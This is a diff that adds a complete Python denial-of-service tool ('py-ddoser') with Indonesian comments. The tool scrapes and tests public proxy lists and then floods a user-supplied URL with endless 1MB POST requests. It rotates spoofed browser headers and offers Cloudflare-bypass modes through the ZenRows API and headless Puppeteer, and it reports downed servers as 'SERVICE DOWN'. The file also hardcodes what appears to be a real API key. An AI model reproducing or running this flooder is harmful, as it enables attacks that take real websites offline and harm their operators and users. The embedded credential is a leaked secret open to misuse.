@@ -1,0 +1,573 @@
+#!/usr/bin/python3
+import threading, urllib3, random, json, time, sys, os, re, asyncio
+from urllib.parse import quote
+import pyppeteer
+from pyppeteer import launch
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+__version__ = "1.1.1"
+__build__ = "stable"
+
+pool = urllib3.PoolManager(headers={"User-Agent": "Mozilla/5.0"})
+working = []
+iphosts = [
+    'https://ipinfo.io/ip',
+    'https://ifconfig.io/ip']
+
+# Konfigurasi ZenRows
+ZENROWS_API_KEY = "9b287eecfc8792d86fc8b00fa1f4b4638896ac6d"  # API key dari contoh
+USE_ZENROWS = False
+USE_PUPPETEER = False
+USE_PUPPETEER_ZENROWS = False
+
+# Generate 1MB payload
+PAYLOAD_1MB = 'A' * (1024 * 1024)  # 1MB data
+
+def logo():
+    os.system("clear")
+    print(f"                           __    __ ")
+    print(f"    ____  __  __      ____/ /___/ /___  ________  _____")
+    print(r"   / __ \/ / / /_____/ __  / __  / __ \/ ___/ _ \/ ___/")
+    print(f"  / /_/ / /_/ /_____/ /_/ / /_/ / /_/ (__  )  __/ /")
+    print(r" / .___/\__, /      \__,_/\__,_/\____/____/\___/_/")
+    print(f"/_/    /____/             by mishakorzik")
+    print(f"                            {__version__} {__build__}")
+    print(f"")
+
+def version():
+    print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Checking for updates")
+    try:
+        resp = pool.request("GET", "https://raw.githubusercontent.com/mishakorzik/py-ddoser/refs/heads/main/version.txt", timeout=5.0).data.decode("utf-8", errors="ignore").replace(" ", "").replace("\n", "")
+        if __version__ == resp:
+            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m No update found")
+        else:
+            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Available a new version '{resp}', update please")
+    except:
+        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Failed to check for updates")
+
+# headers generator
+def generate():
+    headers = {}
+    user_agent = [
+        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", '"Chromium";v="136", "Google Chrome";v="136", "Not A(Brand";v="99"', "Windows"),
+        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", '"Chromium";v="136", "Google Chrome";v="136", "Not A(Brand";v="99"', "macOS"),
+        ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3", '"Chromium";v="134", "Google Chrome";v="134", "Not A(Brand";v="99"', "Linux"),
+        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 OPR/117.0.0.", '"Chromium";v="132", "Opera";v="117", "Not A(Brand";v="99"', "Windows"),
+        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0", None, "Windows"),
+        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:138.0) Gecko/20100101 Firefox/138.0", None, "macOS"),
+        ("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0", None, "Linux"),
+        ("Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0", None, "Linux"),
+        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/119.0.0.0", '"Chromium";v="136", "Opera";v="119", "Not A(Brand";v="99"', "Windows"),
+        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/119.0.0.0", '"Chromium";v="136", "Opera";v="119", "Not A(Brand";v="99"', "macOS"),
+        ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/119.0.0.0", '"Chromium";v="136", "Opera";v="119", "Not A(Brand";v="99"', "Linux"),
+        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.64", '"Chromium";v="136", "Microsoft Edge";v="136", "Not A(Brand";v="99"', "Windows"),
+        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.64", '"Chromium";v="136", "Microsoft Edge";v="136", "Not A(Brand";v="99"', "macOS"),
+        ("Mozilla/5.0 (X11; CrOS x86_64 16181.61.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.198 Safari/537.36", '"Chromium";v="134", "Google Chrome";v="134", "Not A(Brand";v="99"', "Chrome OS"),
+        ("Mozilla/5.0 (X11; CrOS aarch64 16181.61.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.198 Safari/537.36", '"Chromium";v="134", "Google Chrome";v="134", "Not A(Brand";v="99"', "Chrome OS"),
+        ("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", '"Chromium";v="136", "Google Chrome";v="136", "Not A(Brand";v="99"', "Windows")
+    ]
+
+    ua = random.choice(user_agent)
+    headers["User-Agent"] = ua[0]
+    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
+    headers["Accept-Encoding"] = random.choice(["gzip, deflate, br", "gzip, deflate, br, zstd"])
+    headers["Accept-Language"] = random.choice(["hu-HU,hu;q=0.9,en-US;q=0.8,en;q=0.7", "ar-SA,ar;q=0.9,en-US;q=0.8,en;q=0.7", "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7", "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CA,fr;q=0.9,en-CA;q=0.8,en;q=0.7", "sv-SE,sv;q=0.9,nb-NO;q=0.8,en-US;q=0.7,en;q=0.6", "zh-CN,zh;q=0.9,en;q=0.8", "en-IN,en;q=0.9,hi;q=0.8,bn;q=0.7", "en-US,en;q=0.9", "en-US,en;q=0.5"])
+    headers["Cache-Control"] = "max-age=0"
+    if ua[1]:
+        headers["Sec-Ch-Ua"] = ua[1]
+    headers["Sec-Ch-Ua-Mobile"] = "?0"
+    headers["Sec-Ch-Ua-Platform"] = ua[2]
+    headers["Sec-Fetch-Dest"] = "document"
+    headers["Sec-Fetch-Mode"] = "navigate"
+    headers["Sec-Fetch-Site"] = "none"
+    headers["Sec-Fetch-User"] = "?1"
+    headers["Upgrade-Insecure-Requests"] = "1"
+    headers["Connection"] = "keep-alive"
+    return headers
+
+def check(prx):
+    try:
+        resp = urllib3.ProxyManager(
+            proxy_url=f"http://{prx}",
+            timeout=urllib3.util.Timeout(connect=3.0, read=3.0),  # Reduced timeout
+            headers={"User-Agent": "Mozilla/5.0"},
+            retries=False,
+            cert_reqs='NONE'
+        ).request('GET', random.choice(iphosts))
+        print(f"\033[01;32mFound working proxy: {prx}\033[0m")
+        working.append(prx)
+    except:
+        pass
+
+def checker(prx, proxy):
+    # Batasi jumlah proxy yang diperiksa untuk menghindari overload
+    max_check = 1000
+    if len(proxy) > max_check:
+        proxy = random.sample(proxy, max_check)
+    
+    print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Checking {len(proxy)} proxies (max {max_check})...")
+    
+    # Jalankan thread untuk setiap proxy
+    threads = []
+    for p in proxy:
+        t = threading.Thread(target=check, args=(p,), daemon=True)
+        t.start()
+        threads.append(t)
+    
+    # Tunggu hingga batas waktu atau cukup proxy ditemukan
+    start_time = time.time()
+    timeout = 30 if prx == "" else 10
+    
+    while time.time() - start_time < timeout:
+        if len(working) >= 50:
+            break
+        
+        # Cetak status setiap 5 detik
+        if int(time.time() - start_time) % 5 == 0:
+            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Checked {len(proxy)} proxies, found {len(working)} working proxies...")
+        
+        time.sleep(0.5)
+    
+    print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Proxy check completed. Found {len(working)} working proxies.")
+
+# Fungsi untuk bypass Cloudflare dengan ZenRows
+def zenrows_request(url):
+    try:
+        if not ZENROWS_API_KEY:
+            print("\033[01;31m[\033[0m-\033[01;31m]\033[0m ZenRows API key not configured")
+            return
+            
+        # Kirim request POST dengan payload 1MB
+        api_url = f"https://api.zenrows.com/v1/?apikey={ZENROWS_API_KEY}&url={quote(url)}&js_render=true&premium_proxy=true&wait_for=.content"
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': str(len(PAYLOAD_1MB))
+        }
+        
+        resp = pool.request(
+            "POST", 
+            api_url, 
+            body=PAYLOAD_1MB.encode('utf-8'),
+            headers=headers,
+            timeout=30.0
+        )
+        
+        cod = f"\033[0m{resp.status}\033[0m" if (100 <= resp.status <= 199) else f"\033[01;32m{resp.status}\033[0m" if (200 <= resp.status <= 299) else f"\033[01;33m{resp.status}\033[0m" if (300 <= resp.status <= 399) else f"\033[01;31m{resp.status}\033[0m" if (400 <= resp.status <= 499) else f"\033[01;35m{resp.status}\033[0m"
+        
+        # Tanda khusus untuk status 200 dan 503
+        if resp.status == 200:
+            print(f"\033[01;32m[SUCCESS]\033[0m ZenRows: request sent ({cod}), size {len(resp.data)} B (\033[01;32m1MB payload\033[0m)")
+        elif resp.status == 503:
+            print(f"\033[01;35m[SERVICE DOWN]\033[0m ZenRows: request sent ({cod}), size {len(resp.data)} B (\033[01;31mServer overloaded!\033[0m)")
+        else:
+            print(f"ZenRows: request sent ({cod}), size {len(resp.data)} B (\033[01;32m1MB payload\033[0m)")
+    except Exception as e:
+        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m ZenRows error: {e}")
+
+# Fungsi untuk bypass Cloudflare dengan Puppeteer
+async def puppeteer_request(url, proxy=None):
+    try:
+        browser_args = []
+        if proxy:
+            browser_args.append(f'--proxy-server={proxy}')
+            
+        browser = await launch(
+            headless=True,
+            args=browser_args,
+            ignoreHTTPSErrors=True,
+            autoClose=False
+        )
+        
+        page = await browser.newPage()
+        await page.setUserAgent(random.choice([
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3"
+        ]))
+        
+        # Kirim POST request dengan payload 1MB
+        await page.goto(url, {
+            'waitUntil': 'networkidle2',
+            'timeout': 30000
+        })
+        
+        # Tunggu hingga halaman selesai dimuat
+        await page.waitForSelector('body', {'timeout': 10000})
+        
+        # Kirim form dengan payload besar
+        await page.evaluate("""
+            () => {
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = window.location.href;
+                
+                const input = document.createElement('input');
+                input.name = 'data';
+                input.value = '%s';
+                
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+            }
+        """ % PAYLOAD_1MB)
+        
+        # Tunggu respons dan dapatkan status
+        status = 0  # Default status
+        try:
+            response = await page.waitForNavigation({'waitUntil': 'networkidle2', 'timeout': 30000})
+            if response:
+                status = response.status
+            else:
+                # Jika response adalah None, coba dapatkan status dari performance API
+                try:
+                    status = await page.evaluate("""
+                        () => {
+                            const entries = performance.getEntriesByType('navigation');
+                            if (entries.length > 0) {
+                                return entries[0].responseStatus;
+                            }
+                            return 0;
+                        }
+                    """)
+                except:
+                    status = 0
+        except Exception as nav_error:
+            # Jika timeout navigasi, coba dapatkan status dari performance API
+            try:
+                status = await page.evaluate("""
+                    () => {
+                        const entries = performance.getEntriesByType('navigation');
+                        if (entries.length > 0) {
+                            return entries[0].responseStatus;
+                        }
+                        return 0;
+                    }
+                """)
+            except:
+                status = 0  # Default status jika tidak bisa mendapatkan status
+        
+        # Ambil konten halaman
+        content = await page.content()
+        await browser.close()
+        
+        # Tanda khusus untuk status 200 dan 503
+        if status == 200:
+            print(f"\033[01;32m[SUCCESS]\033[0m Puppeteer: request sent (status {status}), size {len(content)} B (\033[01;32m1MB payload\033[0m)")
+        elif status == 503:
+            print(f"\033[01;35m[SERVICE DOWN]\033[0m Puppeteer: request sent (status {status}), size {len(content)} B (\033[01;31mServer overloaded!\033[0m)")
+        else:
+            print(f"Puppeteer: request sent (status {status}), size {len(content)} B (\033[01;32m1MB payload\033[0m)")
+    except Exception as e:
+        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Puppeteer error: {e}")
+
+# Fungsi untuk bypass Cloudflare dengan Puppeteer + ZenRows (sesuai contoh)
+async def puppeteer_zenrows_request(url):
+    try:
+        # Buat koneksi ke browser ZenRows
+        connectionURL = f'wss://browser.zenrows.com?apikey={ZENROWS_API_KEY}'
+        
+        # Terhubung ke browser
+        browser = await pyppeteer.connect({
+            'browserWSEndpoint': connectionURL,
+            'ignoreHTTPSErrors': True
+        })
+        
+        # Buat halaman baru
+        page = await browser.newPage()
+        
+        # Set viewport
+        await page.setViewport({'width': 1920, 'height': 1080})
+        
+        # Set user agent
+        await page.setUserAgent(random.choice([
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3"
+        ]))
+        
+        # Navigasi ke URL target
+        await page.goto(url, {
+            'waitUntil': 'networkidle2',
+            'timeout': 60000
+        })
+        
+        # Tunggu halaman selesai dimuat
+        await page.waitForSelector('body', {'timeout': 30000})
+        
+        # Dapatkan judul halaman
+        title = await page.title()
+        
+        # Kirim form dengan payload besar untuk serangan
+        await page.evaluate("""
+            () => {
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = window.location.href;
+                
+                const input = document.createElement('input');
+                input.name = 'data';
+                input.value = '%s';
+                
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+            }
+        """ % PAYLOAD_1MB)
+        
+        # Tunggu respons dari form submission
+        try:
+            await page.waitForNavigation({'waitUntil': 'networkidle2', 'timeout': 30000})
+        except:
+            # Jika timeout, lanjutkan saja
+            pass
+        
+        # Dapatkan status response
+        try:
+            status = await page.evaluate("""
+                () => {
+                    const entries = performance.getEntriesByType('navigation');
+                    if (entries.length > 0) {
+                        return entries[0].responseStatus;
+                    }
+                    return 0;
+                }
+            """)
+        except:
+            status = 0
+        
+        # Dapatkan konten halaman setelah form submission
+        content = await page.content()
+        
+        # Tampilkan hasil
+        if status == 200:
+            print(f"\033[01;32m[SUCCESS]\033[0m Puppeteer+ZenRows: '{title}' - status {status}, size {len(content)} B (\033[01;32m1MB payload\033[0m)")
+        elif status == 503:
+            print(f"\033[01;35m[SERVICE DOWN]\033[0m Puppeteer+ZenRows: '{title}' - status {status}, size {len(content)} B (\033[01;31mServer overloaded!\033[0m)")
+        else:
+            print(f"Puppeteer+ZenRows: '{title}' - status {status}, size {len(content)} B (\033[01;32m1MB payload\033[0m)")
+        
+        # Tutup koneksi browser
+        await browser.close()
+    except Exception as e:
+        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Puppeteer+ZenRows error: {e}")
+
+def http(url, proxy):
+    try:
+        # Kirim POST request dengan payload 1MB
+        headers = generate()
+        headers['Content-Type'] = 'application/x-www-form-urlencoded'
+        headers['Content-Length'] = str(len(PAYLOAD_1MB))
+        
+        resp = urllib3.ProxyManager(
+            proxy_url=f"http://{proxy}",
+            timeout=urllib3.util.Timeout(connect=7.0, read=7.0),
+            headers=headers,
+            retries=False,
+            cert_reqs='NONE'
+        ).request(
+            'POST', 
+            url,
+            body=PAYLOAD_1MB.encode('utf-8')
+        )
+
+        cod = f"\033[0m{resp.status}\033[0m" if (100 <= resp.status <= 199) else f"\033[01;32m{resp.status}\033[0m" if (200 <= resp.status <= 299) else f"\033[01;33m{resp.status}\033[0m" if (300 <= resp.status <= 399) else f"\033[01;31m{resp.status}\033[0m" if (400 <= resp.status <= 499) else f"\033[01;35m{resp.status}\033[0m"
+        
+        # Tanda khusus untuk status 200 dan 503
+        if resp.status == 200:
+            print(f"\033[01;32m[SUCCESS]\033[0m {proxy}: request sent over \033[01;36mHTTP/1.1\033[0m ({cod}), size {len(resp.data)} B (\033[01;32m1MB payload\033[0m)")
+        elif resp.status == 503:
+            print(f"\033[01;35m[SERVICE DOWN]\033[0m {proxy}: request sent over \033[01;36mHTTP/1.1\033[0m ({cod}), size {len(resp.data)} B (\033[01;31mServer overloaded!\033[0m)")
+        else:
+            print(f"{proxy}: request sent over \033[01;36mHTTP/1.1\033[0m ({cod}), size {len(resp.data)} B (\033[01;32m1MB payload\033[0m)")
+    except:
+        pass
+
+# Fungsi untuk mengambil proxy dari Geonode
+def get_geonode_proxies():
+    try:
+        url = "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc"
+        resp = pool.request("GET", url, timeout=15.0)
+        data = json.loads(resp.data.decode('utf-8'))
+        proxies = []
+        for item in data['data']:
+            proxy_str = f"{item['ip']}:{item['port']}"
+            proxies.append(proxy_str)
+        print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Fetched {len(proxies)} proxies from Geonode")
+        return proxies
+    except Exception as e:
+        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Failed to fetch Geonode proxies: {e}")
+        return []
+
+# Fungsi untuk mengambil proxy dari PubProxy
+def get_pubproxy_proxies():
+    try:
+        url = "http://pubproxy.com/api/proxy?limit=20&format=json&http=true&level=anonymous"
+        resp = pool.request("GET", url, timeout=15.0)
+        data = json.loads(resp.data.decode('utf-8'))
+        proxies = []
+        for item in data['data']:
+            proxy_str = f"{item['ip']}:{item['port']}"
+            proxies.append(proxy_str)
+        print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Fetched {len(proxies)} proxies from PubProxy")
+        return proxies
+    except Exception as e:
+        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Failed to fetch PubProxy proxies: {e}")
+        return []
+
+# Fungsi untuk mengambil proxy dari FreeProxy World
+def get_freeproxy_world_proxies():
+    try:
+        url = "https://www.freeproxy.world/?type=socks5"
+        resp = pool.request("GET", url, timeout=15.0, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
+        html = resp.data.decode('utf-8')
+        
+        # Ekstrak proxy menggunakan regex
+        pattern = r'<tr><td>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td><td>(\d+)</td>'
+        matches = re.findall(pattern, html)
+        
+        proxies = [f"{ip}:{port}" for ip, port in matches]
+        print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Fetched {len(proxies)} proxies from FreeProxy World")
+        return proxies
+    except Exception as e:
+        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Failed to fetch FreeProxy World proxies: {e}")
+        return []
+
+def main():
+    global USE_ZENROWS, USE_PUPPETEER, USE_PUPPETEER_ZENROWS
+    
+    try:
+        url = str(input(f"\033[01;33m[\033[0m?\033[01;33m]\033[0m Enter target (\033[01;34mex.\033[0m https://example.com):\033[01;34m "))
+        if "://" not in url:
+            print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Invalid url")
+            sys.exit(1)
+            
+        # Tanyakan tentang bypass Cloudflare
+        bypass_cf = str(input(f"\033[01;33m[\033[0m?\033[01;33m]\033[0m Bypass Cloudflare? (y/n):\033[01;34m ")).lower()
+        if bypass_cf == 'y':
+            print("\033[01;33m[\033[0m?\033[01;33m]\033[0m Available methods:")
+            print("\033[01;34m1. ZenRows API\033[0m")
+            print("\033[01;34m2. Local Puppeteer\033[0m")
+            print("\033[01;34m3. Puppeteer + ZenRows\033[0m")
+            method = str(input(f"\033[01;33m[\033[0m?\033[01;33m]\033[0m Choose method (1/2/3):\033[01;34m "))
+            
+            if method == '1':
+                USE_ZENROWS = True
+                if not ZENROWS_API_KEY:
+                    print("\033[01;31m[\033[0m-\033[01;31m]\033[0m ZenRows API key not configured. Please set ZENROWS_API_KEY variable.")
+                    sys.exit(1)
+            elif method == '2':
+                USE_PUPPETEER = True
+                print("\033[01;32m[\033[0m+\033[01;32m]\033[0m Using Puppeteer for bypass (requires pyppeteer)")
+            elif method == '3':
+                USE_PUPPETEER_ZENROWS = True
+                if not ZENROWS_API_KEY:
+                    print("\033[01;31m[\033[0m-\033[01;31m]\033[0m ZenRows API key not configured. Please set ZENROWS_API_KEY variable.")
+                    sys.exit(1)
+                print("\033[01;32m[\033[0m+\033[01;32m]\033[0m Using Puppeteer + ZenRows for bypass")
+            else:
+                print("\033[01;31m[\033[0m-\033[01;31m]\033[0m Invalid method selected")
+                sys.exit(1)
+        
+        prx = str(input(f"\033[01;33m[\033[0m?\033[01;33m]\033[0m Enter proxy file ('Enter' to search):\033[01;34m "))
+        if prx == "":
+            # Sumber proxy yang sudah ada
+            proxy1 = pool.request("GET","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=all&ssl=all&anonymity=all",timeout=10.0).data.decode().split()
+            proxy2 = pool.request("GET","https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/refs/heads/main/http.txt",timeout=10.0).data.decode().split()
+            
+            # Sumber proxy baru
+            proxy3 = get_geonode_proxies()
+            proxy4 = get_pubproxy_proxies()
+            proxy5 = get_freeproxy_world_proxies()
+            
+            # Gabungkan semua proxy
+            proxy = list(set(proxy1 + proxy2 + proxy3 + proxy4 + proxy5))
+            
+            # Hapus string kosong
+            proxy = [p for p in proxy if p.strip()]
+            
+            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Total proxies found: {len(proxy)}")
+            del proxy1, proxy2, proxy3, proxy4, proxy5
+        else:
+            file = open(prx, "r")
+            proxy = list(set(file.read().split()))
+            file.close()
+            proxy = [p for p in proxy if p.strip()]
+            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Found proxies: {len(proxy)}")
+            del proxy
+
+        # Periksa proxy
+        threading.Thread(target=checker, args=(prx, proxy, ), daemon=True).start()
+        
+        # Tunggu hingga pemeriksaan selesai
+        time.sleep(1)  # Beri waktu untuk memulai thread
+        
+        # Tunggu hingga thread selesai atau batas waktu tercapai
+        start_time = time.time()
+        timeout = 35 if prx == "" else 15
+        
+        while time.time() - start_time < timeout:
+            # Jika sudah ada cukup proxy yang bekerja, keluar dari loop
+            if len(working) >= 50:
+                break
+            time.sleep(0.5)
+        
+        print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Attacking with {len(working)} working proxies")
+        
+        # Jika tidak ada proxy yang bekerja, gunakan metode tanpa proxy
+        if len(working) == 0:
+            print("\033[01;31m[\033[0m-\033[01;31m]\033[0m No working proxies found. Continuing without proxy...")
+        
+        while True:
+            if USE_ZENROWS:
+                threading.Thread(target=zenrows_request, args=(url,), daemon=True).start()
+            elif USE_PUPPETEER:
+                proxy = random.choice(working) if working else None
+                asyncio.get_event_loop().run_until_complete(puppeteer_request(url, proxy))
+            elif USE_PUPPETEER_ZENROWS:
+                asyncio.get_event_loop().run_until_complete(puppeteer_zenrows_request(url))
+            else:
+                if working:
+                    threading.Thread(target=http, args=(url, random.choice(working)), daemon=True).start()
+                else:
+                    # Jika tidak ada proxy yang bekerja, lakukan request tanpa proxy
+                    try:
+                        headers = generate()
+                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
+                        headers['Content-Length'] = str(len(PAYLOAD_1MB))
+                        
+                        resp = pool.request(
+                            "POST", 
+                            url,
+                            body=PAYLOAD_1MB.encode('utf-8'),
+                            headers=headers,
+                            timeout=10.0
+                        )
+                        
+                        cod = f"\033[0m{resp.status}\033[0m" if (100 <= resp.status <= 199) else f"\033[01;32m{resp.status}\033[0m" if (200 <= resp.status <= 299) else f"\033[01;33m{resp.status}\033[0m" if (300 <= resp.status <= 399) else f"\033[01;31m{resp.status}\033[0m" if (400 <= resp.status <= 499) else f"\033[01;35m{resp.status}\033[0m"
+                        
+                        # Tanda khusus untuk status 200 dan 503
+                        if resp.status == 200:
+                            print(f"\033[01;32m[SUCCESS]\033[0m Direct: request sent ({cod}), size {len(resp.data)} B (\033[01;32m1MB payload\033[0m)")
+                        elif resp.status == 503:
+                            print(f"\033[01;35m[SERVICE DOWN]\033[0m Direct: request sent ({cod}), size {len(resp.data)} B (\033[01;31mServer overloaded!\033[0m)")
+                        else:
+                            print(f"Direct: request sent ({cod}), size {len(resp.data)} B (\033[01;32m1MB payload\033[0m)")
+                    except:
+                        pass
+            
+            # Kontrol kecepatan untuk metode berbeda
+            if USE_PUPPETEER or USE_PUPPETEER_ZENROWS:
+                time.sleep(5)  # Tunggu 5 detik antara request Puppeteer
+            else:
+                time.sleep(0.1)  # Kontrol kecepatan untuk metode lain
+                
+    except KeyboardInterrupt:
+        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Exiting")
+    except Exception as e:
+        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Error: {e}")
+
+if __name__ == "__main__":
+    logo()
+    version()
+    main()
